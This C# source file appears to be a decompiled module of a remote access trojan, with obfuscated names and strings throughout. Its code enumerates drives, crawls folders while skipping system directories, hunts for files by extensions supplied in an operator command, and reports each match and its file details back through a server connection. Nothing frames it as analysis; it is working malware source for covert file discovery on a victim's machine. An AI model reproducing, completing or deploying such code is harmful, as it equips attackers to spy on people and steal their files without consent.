using System;
using System.Collections.Generic;
using System.IO;

namespace wardhmrias;

internal class wardhmrias
{
	public MLREDM iservder;

	public List<string> wardhmriasfdExts = new List<string>();

	public List<string> wardhmriasnotFilders = new List<string>();

	public string wardhmriasmaindPath;

	public int wardhmriassIndx = 0;

	public List<string> wardhmriassdFiles = new List<string>();

	public string wardhmriasfilesdLtogs = DLAONIF.wardhmriasfilesdLtogs;

	public int wardhmriasfIntdx = 0;

	public bool wardhmriasreagting = false;

	public string wardhmriaslookup_Drtives()
	{
		string text = "";
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			if (driveInfo.IsReady)
			{
				text = text + driveInfo.Name + ">|wardhmrias".Split(new char[1] { '|' })[0];
			}
		}
		return text;
	}

	public bool wardhmriassee_Acdcess(string fPath)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(fPath);
		try
		{
			directoryInfo.GetDirectories();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public wardhmrias()
	{
		wardhmriasnotFilders.Add("documents and settings|wardhmrias".Split(new char[1] { '|' })[0]);
		wardhmriasnotFilders.Add("program files|wardhmrias".Split(new char[1] { '|' })[0]);
		wardhmriasnotFilders.Add("system volume information|wardhmrias".Split(new char[1] { '|' })[0]);
		wardhmriasnotFilders.Add("windows|wardhmrias".Split(new char[1] { '|' })[0]);
		wardhmriasnotFilders.Add("program files (x86)|wardhmrias".Split(new char[1] { '|' })[0]);
		wardhmriasnotFilders.Add("programdata|wardhmrias".Split(new char[1] { '|' })[0]);
	}

	public IEnumerable<string> wardhmriasadd_Fifles(string path)
	{
		Queue<string> moreFiles = new Queue<string>();
		moreFiles.Enqueue(path);
		while (moreFiles.Count > 0 && !iservder.wardhmriasautCnls)
		{
			path = moreFiles.Dequeue();
			try
			{
				string[] directories = Directory.GetDirectories(path);
				foreach (string text in directories)
				{
					if (wardhmriassee_Acdcess(text) && !wardhmriasnotFilders.Contains(text.ToLower()))
					{
						moreFiles.Enqueue(text);
					}
				}
			}
			catch
			{
			}
			string[] files = Directory.GetFiles(path);
			if (files != null)
			{
				for (int i = 0; i < files.Length; i++)
				{
					yield return files[i];
				}
			}
		}
	}

	public void wardhmriassendSesarch(string path)
	{
		try
		{
			foreach (string item in wardhmriasadd_Fifles(path))
			{
				string extension = Path.GetExtension(item);
				if (wardhmriasfdExts.Contains(extension.ToLower()))
				{
					string text = iservder.wardhmriasfile_intfo(item, ret: true);
					iservder.wardhmriaspush_dtata(null, "wardhmrias-seaarf=|wardhmrias".Split(new char[1] { '|' })[0] + item + "<FIdLE_AUdTO<|wardhmrias".Split(new char[1] { '|' })[0] + text);
				}
				if (iservder.wardhmriasautCnls)
				{
					break;
				}
			}
		}
		catch
		{
		}
	}

	public string wardhmriaslookup_Fidles(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] files = Directory.GetFiles(path);
			foreach (string text2 in files)
			{
				text = text + text2 + ">|wardhmrias".Split(new char[1] { '|' })[0];
			}
		}
		else
		{
			text = null;
		}
		return text;
	}

	public string wardhmriascheck_Foldrers(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] directories = Directory.GetDirectories(path);
			foreach (string text2 in directories)
			{
				if (wardhmriassee_Acdcess(text2))
				{
					text = text + text2 + ">|wardhmrias".Split(new char[1] { '|' })[0];
				}
			}
			return text;
		}
		return null;
	}

	public void wardhmriaslook_Fides(string tempStr)
	{
		iservder.wardhmriasautCnls = false;
		wardhmriasfdExts.Clear();
		wardhmriassdFiles.Clear();
		wardhmriasfIntdx = 0;
		wardhmriassIndx = 0;
		string[] array = tempStr.Split(new char[1] { '<' });
		if (array.Length <= 1)
		{
			return;
		}
		string[] array2 = array[0].Split(new char[1] { '>' });
		string[] array3 = array2;
		foreach (string text in array3)
		{
			if (text != "")
			{
				wardhmriasfdExts.Add(text);
			}
		}
		if (array[1] != "")
		{
			wardhmriasreagting = true;
			wardhmriassendSesarch(array[1]);
			wardhmriasreagting = false;
			iservder.wardhmriaspush_dtata(null, "wardhmrias-seaard=seahed|wardhmrias".Split(new char[1] { '|' })[0]);
		}
	}
}
